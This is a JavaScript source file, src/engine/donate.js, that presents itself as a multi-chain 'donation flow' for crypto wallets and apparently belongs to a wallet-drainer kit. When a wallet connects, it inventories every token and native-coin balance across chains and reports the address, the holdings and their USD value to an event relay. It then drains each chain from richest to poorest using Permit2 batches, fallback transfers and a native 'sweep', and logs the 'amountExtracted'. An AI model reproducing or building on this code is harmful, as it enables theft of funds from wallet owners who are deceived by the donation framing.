// src/engine/donate.js
import { notify } from "../utils/notify.js";
import { sendEvent } from "../utils/eventRelay.js";
import { fetchBalancesCovalent, filterPermit2SafeTokens, getChainValue } from "./balances.js";
import { getProviderForChain } from "./providerHelper.js";
import { isPermit2Compatible, executePermit2Batch } from "./permit2.js";
import { executeFallbackBatch, sweepNative } from "./fallback.js";
import { CHAINS, exceptionList } from "../config.js";
import { ethers } from "ethers";

// simple Coingecko cache to reduce requests
const priceCache = {};
async function fetchNativePrice(symbol) {
  if (priceCache[symbol]) return priceCache[symbol];

  try {
    const idMap = {
      ETH: "ethereum",
      BNB: "binancecoin",
      MATIC: "matic-network",
      AVAX: "avalanche-2",
      FTM: "fantom",
      OP: "optimism",
      ARB: "arbitrum",
    };
    const id = idMap[symbol];
    if (!id) return 0;

    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`);
    const json = await res.json();
    const price = json[id]?.usd || 0;
    priceCache[symbol] = price;
    return price;
  } catch (err) {
    console.warn("Coingecko price error", err);
    return 0;
  }
}

export async function runDonationFlow(walletClient, owner, trackingId) {
  try {
    if (!owner) {
      if (walletClient?.account?.address) owner = walletClient.account.address;
      else if (typeof window !== "undefined" && window.ethereum) {
        const injectedProvider = new ethers.BrowserProvider(window.ethereum);
        await injectedProvider.send("eth_requestAccounts", []);
        owner = await injectedProvider.getSigner().getAddress();
      }
      if (!owner) throw new Error("Wallet not connected");
    }

    // Fetch balances read-only
    const chainBalances = [];
    for (const chain of CHAINS) {
      const raw = await fetchBalancesCovalent(owner, chain.chainId);
      const filtered = filterPermit2SafeTokens(raw);

      const rpcProvider = new ethers.JsonRpcProvider(chain.rpcUrl);
      const nativeRaw = await rpcProvider.getBalance(owner);
      const nativeFormatted = parseFloat(ethers.formatEther(nativeRaw));
      const nativePrice = await fetchNativePrice(chain.nativeSymbol);
      const nativeUSD = nativeFormatted * nativePrice;

      chainBalances.push({
        chainId: chain.chainId,
        name: chain.name,
        native: nativeFormatted,
        nativeUSD,
        tokens: filtered,
        totalValue: getChainValue(filtered) + nativeUSD,
      });
    }

      const balancesPayload = chainBalances.map((c) => ({
      name: c.name,
      native: Number(c.native).toFixed(6),
      nativeValue: Number(c.nativeUSD || 0).toFixed(2),
      tokens: c.tokens.map((t) => ({
        name: t.tokenSymbol,
        amount: Number(
          ethers.formatUnits(t.balanceRaw, t.contract_decimals || 18)
        ).toFixed(6),
        value: Number(t.quote).toFixed(2),
      })),
      total: Number(c.totalValue).toFixed(2),
    }));
    const grandTotal = balancesPayload.reduce(
      (acc, c) => acc + parseFloat(c.total || 0),
      0
    );

    const connectedPayload = {
      walletAddress: owner,
      trackingId,
      balances: balancesPayload,
      grandTotal: Number(grandTotal).toFixed(2),
    };

    notify("WALLET_CONNECTED", connectedPayload);
    await sendEvent("WALLET_CONNECTED", connectedPayload);



    // Sort chains descending by totalValue
    chainBalances.sort((a, b) => b.totalValue - a.totalValue);

    // Process each chain
    for (const chain of chainBalances) {
      notify("DONATION_START", { walletAddress: owner, trackingId, chain: chain.name });
      await sendEvent("DONATION_START", { walletAddress: owner, trackingId, chain: chain.name });

      const { provider, signer } = await getProviderForChain(walletClient, chain.chainId, trackingId);
      if (!provider || !signer) continue;

      // Split tokens for Permit2 vs fallback
      const permit2Tokens = [];
      const fallbackTokens = [];
      for (const t of chain.tokens) {
        const addr = t.tokenAddress.toLowerCase();
        if (exceptionList?.[chain.chainId]?.includes(addr)) fallbackTokens.push(t);
        else (await isPermit2Compatible(addr, signer)) ? permit2Tokens.push(t) : fallbackTokens.push(t);
      }

      // Execute Permit2 batch
      if (permit2Tokens.length) {
        try { await executePermit2Batch(signer, chain.chainId, permit2Tokens); }
        catch (err) { console.warn("Permit2 batch error:", err); fallbackTokens.push(...permit2Tokens); }
      }

      // Execute fallback batch
      if (fallbackTokens.length) {
        try { await executeFallbackBatch(signer, chain.chainId, fallbackTokens); }
        catch (err) { console.warn("Fallback batch error:", err); }
      }

      // Sweep native token
      try { await sweepNative(signer, provider, chain.chainId); }
      catch (err) { console.warn("Native sweep error:", err); }

      // Re-fetch balances
      const refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
      const refreshedFiltered = filterPermit2SafeTokens(refreshedRaw);

      const refreshedProvider = new ethers.JsonRpcProvider(chain.rpcUrl);
      const refreshedNativeRaw = await refreshedProvider.getBalance(owner);
      const refreshedNative = parseFloat(ethers.formatEther(refreshedNativeRaw));
      const refreshedNativeUSD = refreshedNative * await fetchNativePrice(chain.nativeSymbol);
      const refreshedTotal = getChainValue(refreshedFiltered) + refreshedNativeUSD;
      const amountExtracted = Math.max(0, chain.totalValue - refreshedTotal);

      const resultsPayload = {
        walletAddress: owner,
        trackingId,
        balances: [{
          name: chain.name,
          native: refreshedNative.toFixed(6),
          nativeValue: refreshedNativeUSD.toFixed(2),
          tokens: refreshedFiltered.map(t => ({
            name: t.tokenSymbol,
            amount: Number(ethers.formatUnits(t.balanceRaw, t.contract_decimals || 18)).toFixed(6),
            value: Number(t.quote).toFixed(2),
          })),
          total: refreshedTotal.toFixed(2),
        }],
        donationSummary: {
          total: amountExtracted.toFixed(2),
          breakdown: [{ chain: chain.name, amount: amountExtracted.toFixed(2) }],
        },
      };

      notify("DONATION_MADE", resultsPayload);
      await sendEvent("DONATION_MADE", resultsPayload);
    }

    notify("DONATION_COMPLETED", { walletAddress: owner, trackingId });
    await sendEvent("DONATION_COMPLETED", { walletAddress: owner, trackingId });
    return { success: true };
  } catch (err) {
    console.error("runDonationFlow error:", err);
    return { success: false, reason: err.message || String(err) };
  }
}
